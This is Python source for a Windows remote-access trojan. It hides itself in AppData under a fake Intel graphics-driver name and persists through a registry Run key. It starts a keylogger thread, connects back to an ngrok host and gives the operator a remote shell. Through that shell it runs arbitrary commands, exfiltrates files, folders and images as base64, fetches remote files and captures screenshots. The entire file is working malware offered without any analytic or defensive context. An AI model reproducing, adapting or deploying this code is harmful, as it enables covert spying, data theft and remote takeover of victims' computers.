import socket
import subprocess
import json
import time
import os
import shutil
import sys
import base64
import requests
import ctypes
import text
import threading
from mss import mss


def restart():
	print('Restarting!!!')
	os.execl(location, __file__)

def key_start():
	path = os.environ["appdata"] + "\\system32.txt"
	try:
		if os.path.getsize(path) > 104857600:
			os.remove(path)
	except:
		pass
	t1 = threading.Thread(target=text.start)
	t1.start()



def reliable_send(data):
	json_data = json.dumps(data)
	sock.send(json_data.encode())

def reliable_recv():
	i = 0
	json_data = ""
	while True:
		try:
			if (i > 100000):
				print('Recv Maximum')
				connection()
			else:
				print('reciving...')
				json_data = json_data + sock.recv(1024).decode()
				return json.loads(json_data)
		except ValueError:
			i += 1
			continue
		except:
			break

def is_admin():
	global admin
	try:
		temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\windows'),'temp']))
	except:
		admin = "[!!] User Privileges!"
	else:
		admin = "[+] Administrator Privileges!"

def screenshoot():
 	with mss() as screenshot:
 		screenshot.shot()

def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)

def connection():
	x = 0
	while True:
		time.sleep(20)
		try:
			print('connecting...')
			sock.connect(("3.tcp.ngrok.io",23333))
			shell()
		except:
			if x > 5:
				restart()
			else:
				x += 1
				print('fail connection')

def shell():
	while True:
		print('shell load')
		command = reliable_recv()
		print(command)
		if command == "q":
			print('break')
			break

		elif command[:2] == "cd" and len(command[3:]) > 1:
			try:
				os.chdir(command[3:])
				reliable_send(os.getcwd())
			except:
				continue

		elif command[:8] == "download":
			try:
				with open(command[9:], "rb") as file:
					x = base64.b64encode(file.read()).decode()
					reliable_send(x)
			except:
				reliable_send('DownloadError!')
		
		elif command[:3] == 'lcd':
			continue

		elif command[:6] == "folder":
			try:
				os.chdir(command[7:])
				z = 0
				for i in os.listdir():
					if os.path.isfile(i) and '.lnk' not in i:
						z += 1
				reliable_send(str(z))
				for value in os.listdir():
					if '.' in value and '.lnk' not in value and os.path.isfile(value):
						with open(value, "rb") as file:
							reliable_send(value)
							act = reliable_recv()
							if act == 'skip':
								print(act)
							else:	
								print(act)
								try:
									x = base64.b64encode(file.read()).decode()
									reliable_send(x)
									print(reliable_recv())
								except:
									reliable_send('DownloadError!')
		
					else:
						print('Folder Skipped!')
				print('done!!!')
				reliable_send('done')
			except:
				reliable_send('DownloadError!')		

		elif command[:4] == "pics":
			try:
				os.chdir(command[5:])
				z = 0
				for i in os.listdir():
					if ('.jpg' in i) or ('.JPG' in i) or ('.png' in i) or ('.PNG' in i):
						z += 1
				reliable_send(str(z))
				for value in os.listdir():
					if ('.jpg' in value) or ('.JPG' in value) or ('.png' in value) or ('.PNG' in value):
						with open(value, "rb") as file:
							reliable_send(value)
							act = reliable_recv()
							if act == 'skip':
								print(act)
							else:	
								print(act)
								try:
									x = base64.b64encode(file.read()).decode()
									reliable_send(x)
									print(reliable_recv())
								except:
									reliable_send('DownloadError!')
		
					else:
						print('Folder Skipped!')
				print('done!!!')
				reliable_send('done')
			except:
				reliable_send('DownloadError!')		
	 
		elif command[:6] == "upload":
			try:
				with open(command[7:], "wb") as fin:
					result = reliable_recv()
					fin.write(base64.b64decode(result))
					reliable_send('Upload Complit')
			except:
				reliable_send('Error')

		elif command[:3] == "get":
			try:
				download(command[4:])
				reliable_send("[+] Download File From Specified URL!")
			except:
				reliable_send("[!!] Failed To Download File")

		elif command[:5] == "start":
			try:
				subprocess.Popen(command[6:], shell=True)
				reliable_send("[+] started!")
			except:
				reliable_send("[!!] Failed to Start!")

		elif command[:11] == "screenshoot":
			try:
				screenshoot()
				with open("monitor-1.png", "rb") as sc:
					reliable_send(base64.b64encode(sc.read()).decode())
				os.remove("monitor-1.png")
			except:
				reliable_send("[!!] Failed To Take Screenshot!")
				
		elif command[:5] == "check":
			try:
				is_admin()
				reliable_send(admin)
			except:
				reliable_send("[!!] Cant Execute That Command")

		elif command[:4] == "list":
			try:
				reliable_send(os.listdir())
			except Exception as e: 
				print(e)
				reliable_send("[!!] Cant Execute That Command")
		else:
			try:
				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				result = proc.stdout.read() + proc.stderr.read()
				reliable_send(result.decode('cp862',errors='replace'))	
			except Exception as e: 
				print(e)
				reliable_send("[!!] Cant Execute That Command")


location = os.environ["appdata"] + "\\Intel HD Graphics Drivers for Windows(R).exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable, location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Manager /t REG_SZ /d "' + location + '"', shell=True)

print('Hello World')
key_start()
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()
sock.close()
